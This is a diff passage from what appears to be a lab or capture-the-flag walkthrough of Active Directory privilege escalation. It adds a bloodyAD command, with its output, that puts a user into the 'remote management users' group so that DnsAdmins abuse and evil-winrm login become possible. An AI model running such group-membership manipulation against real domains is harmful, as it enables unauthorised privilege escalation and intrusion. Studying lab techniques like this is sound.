@@ -673,8 +673,11 @@ bloodyAD --host dc01.fragments.local -d fragments.local -k add groupMember 'dnsa
 To exploit `dnsadmins` i also need a way of executing powershell, so ill also add this user to the remote management users group
 
 ```python
-
+bloodyAD --host dc01.fragments.local -d fragments.local -k add groupMember 'remote management users' 'sharedadmin' 
+[+] sharedadmin added to remote management users
 ```
+
+Now the groups are set up, i can work on logging into evil-wirm but first ill need to generate a realm since im using kerb
 
 
 
